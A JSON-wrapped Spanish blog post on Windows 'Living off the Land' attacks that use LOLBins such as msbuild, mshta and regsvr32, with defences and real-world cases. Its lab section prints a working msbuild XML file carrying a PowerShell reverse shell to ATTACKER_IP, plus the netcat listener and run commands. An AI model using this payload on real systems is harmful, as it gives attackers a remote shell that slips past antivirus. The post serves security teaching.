[
    {
        "id": "1754689161596",
        "title": "üî• Living off the Land üî•",
        "subtitle": "C√≥mo los atacantes utilizan herramientas leg√≠timas de Windows para comprometer sistemas en 2025",
        "type": "hacking",
        "time": "10-08-2025",
        "image": "/publicaciones/livingon.jpg",
        "body": "## üìå Introducci√≥n\nEn el vasto campo de la ciberseguridad ofensiva, los ataques m√°s exitosos no son siempre los m√°s sofisticados, sino los m√°s discretos. En 2025, una t√©cnica sigue siendo extremadamente eficaz y a menudo ignorada por soluciones EDR: los ataques *Living off the Land* (LotL), que utilizan binarios leg√≠timos del sistema operativo, conocidos como **LOLBins** (*Living Off the Land Binaries*).\n\nEste art√≠culo profundiza en c√≥mo operan estos ataques, por qu√© siguen siendo v√°lidos hoy, c√≥mo puedes probarlos en entornos controlados y qu√© medidas tomar para detectarlos y mitigarlos.\n\n---\n\n## üß† ¬øQu√© es \"Living off the Land\"?\nEs una t√©cnica donde el atacante utiliza herramientas leg√≠timas del sistema operativo para ejecutar sus cargas maliciosas, evitando as√≠ las detecciones tradicionales.\n\n<div class=\"not-prose grid md:grid-cols-2 gap-3 my-4\">\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">certutil.exe</h3><p class=\"opacity-80 text-sm\">Descarga de archivos desde Internet</p></div></div>\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">mshta.exe</h3><p class=\"opacity-80 text-sm\">Ejecuci√≥n de c√≥digo remoto v√≠a HTML/JS</p></div></div>\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">powershell.exe</h3><p class=\"opacity-80 text-sm\">Automatizaci√≥n y ejecuci√≥n de c√≥digo</p></div></div>\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">rundll32.exe</h3><p class=\"opacity-80 text-sm\">Ejecuci√≥n de DLLs o evasi√≥n</p></div></div>\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">wmic.exe</h3><p class=\"opacity-80 text-sm\">Reconocimiento y ejecuci√≥n remota</p></div></div>\n  <div class=\"card bg-base-200\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">regsvr32.exe</h3><p class=\"opacity-80 text-sm\">DLLs remotas (Squiblydoo)</p></div></div>\n  <div class=\"card bg-base-200 md:col-span-2\"><div class=\"card-body p-4\"><h3 class=\"card-title text-sm\">msbuild.exe</h3><p class=\"opacity-80 text-sm\">Compilaci√≥n/ejecuci√≥n de payloads sin tocar disco</p></div></div>\n</div>\n\n---\n\n## üéØ ¬øPor qu√© es tan eficaz en 2025?\n- Persisten en sistemas actualizados: binarios leg√≠timos presentes en Windows 10/11.  \n- Evasi√≥n de antivirus/EDR: firmados por Microsoft ‚Üí confianza por defecto.  \n- Muchas acciones no requieren privilegios elevados.  \n- Permiten pivotar y escalar privilegios con bajo perfil.\n\n<div class=\"alert alert-info my-4\">\n  <span>En seguridad defensiva, prioriza <b>detecci√≥n basada en comportamiento</b> antes que firmas est√°ticas.</span>\n</div>\n\n---\n\n## ‚öîÔ∏è Escenario de laboratorio: Abusar de <code>msbuild.exe</code> para ejecutar una reverse shell\n> **Solo en entornos controlados**. Respeta la ley y pol√≠ticas de tus clientes.\n\n**Objetivo:** Obtener una shell remota utilizando `msbuild.exe` con un archivo XML especialmente dise√±ado.  \n**Requisitos:** Windows 10/11, `msbuild.exe` (Visual Studio o Build Tools), y Netcat en la m√°quina atacante.\n---\n### 1Ô∏è‚É£ Preparar el payload XML (`reverse.xml`)\n  <div class=\"mt-3 rounded-xl bg-base-200 text-base-content shadow ring-1 ring-base-300 overflow-hidden\">\n    <div class=\"flex items-center gap-2 px-4 py-2 border-b border-base-300\">\n      <!-- puntitos decorativos estilo ventana -->\n      <span class=\"inline-flex gap-1 mr-2\">\n        <span class=\"w-2.5 h-2.5 rounded-full bg-base-300\"></span>\n        <span class=\"w-2.5 h-2.5 rounded-full bg-base-300\"></span>\n        <span class=\"w-2.5 h-2.5 rounded-full bg-base-300\"></span>\n      </span>\n      <span class=\"text-xs font-medium\">reverse.xml</span>\n    </div>\n  <div class=\"not-prose md:max-w-3xl mx-auto\">\n  <pre class=\"block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden\">\n&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"ReverseShell\"&gt;\n    &lt;Exec Command=\"powershell -nop -w hidden -c &quot;$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}&quot;\" /&gt;\n  &lt;/Target&gt;\n&lt;/Project&gt;\n  </pre>\n</div>\n</div>\n\n## ‚ö†Ô∏è Reemplaza ATTACKER_IP por tu IP real.\n\n---\n### 2Ô∏è‚É£ Iniciar listener en tu Kali:\n  <pre class=\"block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden\">\nnc -lvnp 4444\n  </pre>\n\n### 3Ô∏è‚É£ Ejecutar el payload en la m√°quina Windows:\n  <pre class=\"block w-full rounded-xl bg-base-200 text-base-content px-4 py-4 font-mono text-xs leading-5 whitespace-pre overflow-x-auto overflow-y-hidden\">\nmsbuild.exe reverse.xml\n  </pre>\n\n## Si todo funciona correctamente, deber√≠as obtener una reverse shell directamente desde una herramienta leg√≠tima de Microsoft.\n\n---\n\nüõ°Ô∏è ¬øC√≥mo defenderse?\nEDR con reglas de comportamiento, no solo de firmas.\nBloqueo de **LOLBins** no utilizados en tu entorno *(Applocker/SRP/WDAC)*.\nMonitoreo activo de procesos inusuales como <code>msbuild.exe</code> ejecutando conexiones de red.\nDeshabilitar componentes no necesarios de Windows *(ej. scripting, macros, PowerShell sin restricciones)*.\n\n---\n\nüìÅ Casos reales (Resumen)\n**APT32** (OceanLotus): uso extensivo de <code>regsvr32.exe</code> para ejecutar DLLs remotas.\n**FIN7**: abuso de <code>mshta.exe</code> y <code>msbuild.exe</code> para cargar malware sin escribir en disco.\n**Ransomware modernos** (Lockbit, BlackCat): uso de PowerShell y LOLBins en fases de reconocimiento y ejecuci√≥n lateral.\n\n---\n\n‚úÖ Conclusi√≥n\nLos ataques **LotL** y **LOLBins** no son algo del pasado; son t√©cnicas activas y **extremadamente efectivas** en 2025. Saber c√≥mo funcionan, replicarlos en entornos controlados y defenderse de ellos no solo te posiciona como un experto, sino que fortalece enormemente la seguridad de tus clientes."
    }
]